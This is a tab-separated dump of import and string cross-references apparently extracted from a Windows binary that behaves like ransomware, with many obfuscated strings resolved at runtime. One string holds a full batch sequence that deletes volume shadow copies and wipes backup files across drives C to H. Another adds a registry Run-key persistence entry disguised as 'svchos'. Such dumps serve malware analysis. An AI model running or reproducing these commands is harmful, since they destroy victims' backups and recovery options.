reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x140007375	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007382	0x1400251ea	string	0x140006900	1?=/8
0x140007389	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007396	0x1400250f0	string	0x140006900	53',)\a9
0x1400073a4	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400073b8	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400073cc	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400073d9	0x140025122	string	0x140006900	16,\f!
0x1400073e7	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400073f4	0x140025186	string	0x140006900	%?=*$
0x140007402	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007416	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007423	0x140024ff6	string	0x140006900	%?=/8
0x140007431	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x14000743e	0x140024e98	string	0x140006900	%6&\v0
0x14000744c	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007459	0x1400250be	string	0x140006900	$3'\r
0x140007467	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007474	0x1400200f8	string	0x140006900	WaitForMultipleObjects
0x140007482	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x14000748f	0x140024b78	string	0x140006900	%?=$>
0x140007496	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400074aa	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400074b7	0x140024d9e	string	0x140006900	%?=$>
0x1400074be	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400074cb	0x140024eca	string	0x140006900	%?=$>
0x1400074d2	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400074d8	0x140024c0e	string	0x140006900	!(,\b%\a
0x1400074e6	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400074f3	0x140020110	string	0x140006900	GetFileSizeEx
0x1400074fa	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007515	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007522	0x1400251b8	string	0x140006900	%?=%>
0x140007530	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x14000754b	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007558	0x1400255d2	string	0x140006900	0?.&!\a4
0x140007566	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x14000757a	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007587	0x140024ca4	string	0x140006900	%?=>8\f>&
0x140007595	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400075a2	0x140024f2e	string	0x140006900	1?=/8
0x1400075b0	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400075bd	0x1400255a0	string	0x140006900	0?.&!\a4
0x1400075c4	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400075d1	0x140024bdc	string	0x140006900	1?=/8
0x1400075d8	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400075e5	0x14002524e	string	0x140006900	%?==8
0x1400075f3	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007600	0x14002505a	string	0x140006900	%?=/8
0x140007607	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007614	0x140024b14	string	0x140006900	$3'\r
0x14000761b	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007636	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007643	0x140020120	string	0x140006900	MoveFileExW
0x140007651	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007665	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007680	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007694	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400076a8	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400076b5	0x140020130	string	0x140006900	SetFilePointerEx
0x1400076c3	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400076de	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400076eb	0x140024e66	string	0x140006900	$(,\f
0x1400076f2	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007706	0x140024d6c	string	0x140006900	!(,\b%\a\n;
0x14000770d	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x14000771a	0x140024cd6	string	0x140006900	!(,\b%\a
0x140007721	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x14000772e	0x140020148	string	0x140006900	CreateThread
0x140007735	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007750	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x14000775d	0x140025730	string	0x140006900	!5\n\e4
0x14000776b	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007778	0x140024d08	string	0x140006900	!(,\b%\a
0x14000777f	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x14000778c	0x14002508c	string	0x140006900	%?=/8
0x14000779a	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400077ae	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x1400077bb	0x140025668	string	0x140006900	0?.-4
0x1400077c9	0x1400180b8	import	0x140006900	KERNEL32.dll.GetProcAddress
0x140007b13	0x14002650c	string	0x1400078f0	lTGg_
0x140007b66	0x140020160	string	0x1400078f0	vssadmin Delete Shadows /all /quiet\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded\r\nvssadmin Delete Shadows /all /quiet\r\ndel /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk\r\ndel /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk\r\ndel /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk\r\ndel /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk\r\ndel /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk\r\ndel /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk\r\ndel %0
0x140007e49	0x140020758	string	0x140007e30	kernel32.dll
0x140007e58	0x140018078	import	0x140007e30	KERNEL32.dll.LoadLibraryA
0x140007e69	0x140020768	string	0x140007e30	IsWow64Process
0x140007e98	0x1400180b8	import	0x140007e30	KERNEL32.dll.GetProcAddress
0x140007ea6	0x140018108	import	0x140007e30	KERNEL32.dll.GetCurrentProcess
0x140007eb9	0x1400180d8	import	0x140007e30	KERNEL32.dll.FreeLibrary
0x140007f1e	0x1400180b0	import	0x140007ee0	KERNEL32.dll.GetWindowsDirectoryW
0x140007f8a	0x14001ffd0	string	0x140007ee0	\System32\cmd.exe
0x140007fbd	0x140018100	import	0x140007ee0	KERNEL32.dll.GetModuleFileNameW
0x140007fc3	0x140020780	string	0x140007ee0	/C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "
0x140008126	0x140020850	string	0x140007ee0	" /f
0x140008196	0x140020860	string	0x140007ee0	/reg:64
0x1400081c9	0x1400182f0	import	0x140007ee0	SHELL32.dll.ShellExecuteW
0x14000823f	0x140018168	import	0x140008234	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008248	0x140018160	import	0x140008234	KERNEL32.dll.UnhandledExceptionFilter
0x14000824e	0x140018108	import	0x140008234	KERNEL32.dll.GetCurrentProcess
0x140008261	0x140018170	import	0x140008234	KERNEL32.dll.TerminateProcess
0x14000828d	0x14000845c	string	0x140008234	@SVWH
0x1400083f9	0x140018148	import	0x1400083ec	KERNEL32.dll.RtlCaptureContext
0x140008411	0x140018150	import	0x1400083ec	KERNEL32.dll.RtlLookupFunctionEntry
0x140008448	0x140018158	import	0x1400083ec	KERNEL32.dll.RtlVirtualUnwind
0x140008467	0x140018148	import	0x14000845c	KERNEL32.dll.RtlCaptureContext
0x140008481	0x140018150	import	0x14000845c	KERNEL32.dll.RtlLookupFunctionEntry
0x1400084b8	0x140018158	import	0x14000845c	KERNEL32.dll.RtlVirtualUnwind
0x140008a1c	0x140018198	import	0x1400089f0	KERNEL32.dll.GetSystemTimeAsFileTime
0x140008a2a	0x140018190	import	0x1400089f0	KERNEL32.dll.GetCurrentThreadId
0x140008a36	0x140018188	import	0x1400089f0	KERNEL32.dll.GetCurrentProcessId
0x140008a46	0x140018180	import	0x1400089f0	KERNEL32.dll.QueryPerformanceCounter
0x140008ab3	0x1400181a0	import	0x140008aac	KERNEL32.dll.InitializeSListHead
0x140008b4d	0x140018148	import	0x140008b08	KERNEL32.dll.RtlCaptureContext
0x140008b67	0x140018150	import	0x140008b08	KERNEL32.dll.RtlLookupFunctionEntry
0x140008ba8	0x140018158	import	0x140008b08	KERNEL32.dll.RtlVirtualUnwind
0x140008bfc	0x1400181a8	import	0x140008b08	KERNEL32.dll.IsDebuggerPresent
0x140008c1d	0x140018168	import	0x140008b08	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008c28	0x140018160	import	0x140008b08	KERNEL32.dll.UnhandledExceptionFilter
0x140008c6c	0x1400181b0	import	0x140008c50	KERNEL32.dll.GetStartupInfoW
0x140008c96	0x1400181b8	import	0x140008c90	KERNEL32.dll.GetModuleHandleW
0x140008ceb	0x140018168	import	0x140008ce4	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008fd5	0x140018100	import	0x140008fa4	KERNEL32.dll.GetModuleFileNameW
0x140008fed	0x140018060	import	0x140008fa4	KERNEL32.dll.GetLastError
0x140009031	0x1400183b8	string	0x140008fa4	Main Invoked.
0x1400090ed	0x140018100	import	0x1400090bc	KERNEL32.dll.GetModuleFileNameW
0x140009105	0x140018060	import	0x1400090bc	KERNEL32.dll.GetLastError
0x140009149	0x1400183c8	string	0x1400090bc	Main Returned.
0x140009514	0x1400181f8	import	0x140009468	KERNEL32.dll.LoadLibraryExW
0x140009527	0x140018060	import	0x140009468	KERNEL32.dll.GetLastError
0x14000953a	0x1400181f8	import	0x140009468	KERNEL32.dll.LoadLibraryExW
0x140009577	0x1400180d8	import	0x140009468	KERNEL32.dll.FreeLibrary
0x1400095ab	0x1400180b8	import	0x140009468	KERNEL32.dll.GetProcAddress
0x140009652	0x1400184a8	string	0x140009630	EventRegister
0x140009663	0x1400184a8	string	0x140009630	EventRegister
0x1400096e6	0x1400184c0	string	0x1400096b4	EventSetInformation
0x140009745	0x1400184d8	string	0x140009738	EventUnregister
0x140009758	0x1400184d8	string	0x140009738	EventUnregister
0x1400097bf	0x1400184f0	string	0x14000978c	EventWriteTransfer
0x140009831	0x140018510	string	0x140009824	FlsAlloc
0x140009844	0x140018510	string	0x140009824	FlsAlloc
0x140009867	0x1400181d8	import	0x140009824	KERNEL32.dll.TlsAlloc
0x140009884	0x140018528	string	0x140009878	FlsFree
0x140009897	0x140018528	string	0x140009878	FlsFree
0x1400098bb	0x1400181f0	import	0x140009878	KERNEL32.dll.TlsFree
0x1400098de	0x140018548	string	0x1400098cc	FlsSetValue
0x1400098e7	0x140018548	string	0x1400098cc	FlsSetValue
0x14000991d	0x1400181e8	import	0x1400098cc	KERNEL32.dll.TlsSetValue
0x14000994b	0x140018560	string	0x140009934	InitializeCriticalSectionEx
0x14000995e	0x140018560	string	0x140009934	InitializeCriticalSectionEx
0x140009990	0x1400181d0	import	0x140009934	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x140009a02	0x1400180d8	import	0x1400099e4	KERNEL32.dll.FreeLibrary
0x140009b8f	0x140018210	import	0x140009b70	KERNEL32.dll.DeleteCriticalSection
0x140009c00	0x1400181b8	import	0x140009bcc	KERNEL32.dll.GetModuleHandleW
0x140009d6c	0x140018108	import	0x140009d44	KERNEL32.dll.GetCurrentProcess
0x140009d77	0x140018170	import	0x140009d44	KERNEL32.dll.TerminateProcess
0x140009d86	0x140018218	import	0x140009d44	KERNEL32.dll.ExitProcess
0x140009da7	0x140018ef8	string	0x140009d90	mscoree.dll
0x140009db0	0x140018220	import	0x140009d90	KERNEL32.dll.GetModuleHandleExW
0x140009dbf	0x140018f10	string	0x140009d90	CorExitProcess
0x140009dc6	0x1400180b8	import	0x140009d90	KERNEL32.dll.GetProcAddress
0x140009deb	0x1400180d8	import	0x140009d90	KERNEL32.dll.FreeLibrary
0x140009eaf	0x140009eb6	string	0x140009e74	HcȺ\b blocks=Basic Latin,Latin Extended-B
0x14000a014	0x140018200	import	0x14000a010	KERNEL32.dll.EnterCriticalSection
0x14000a020	0x140018208	import	0x14000a01c	KERNEL32.dll.LeaveCriticalSection
0x14000a195	0x14000a1cd	string	0x14000a144	E+BHI
0x14000a231	0x14000a26a	string	0x14000a1e0	E+BHI
0x14000a90d	0x14000a928	string	0x14000a904	<Nu'
0x14000abf5	0x14000ac06	string	0x14000aa80	E2\rA
0x14000abff	0x14000ac06	string	0x14000aa80	E2\rA
0x14000ad53	0x140018f7c	string	0x14000acfc	(null)
0x14000b316	0x140018f88	string	0x14000b2c8	(null)
0x14000b32f	0x140018f7c	string	0x14000b2c8	(null)
0x14000bc83	0x140018238	import	0x14000bc38	KERNEL32.dll.GetModuleFileNameA
0x14000bec9	0x14000be76	string	0x14000be1c	A86taH
0x14000c8ea	0x140018120	import	0x14000c8d4	KERNEL32.dll.HeapFree
0x14000c8fc	0x140018060	import	0x14000c8d4	KERNEL32.dll.GetLastError
0x14000c952	0x1400180a8	import	0x14000c914	KERNEL32.dll.HeapAlloc
0x14000ca81	0x1400180a8	import	0x14000ca2c	KERNEL32.dll.HeapAlloc
0x14000ce3e	0x140018200	import	0x14000ce2c	KERNEL32.dll.EnterCriticalSection
0x14000ce67	0x140018210	import	0x14000ce48	KERNEL32.dll.DeleteCriticalSection
0x14000ce92	0x140018208	import	0x14000ce80	KERNEL32.dll.LeaveCriticalSection
0x14000cf38	0x1400181f8	import	0x14000ce9c	KERNEL32.dll.LoadLibraryExW
0x14000cf46	0x140018060	import	0x14000ce9c	KERNEL32.dll.GetLastError
0x14000cf59	0x1400181f8	import	0x14000ce9c	KERNEL32.dll.LoadLibraryExW
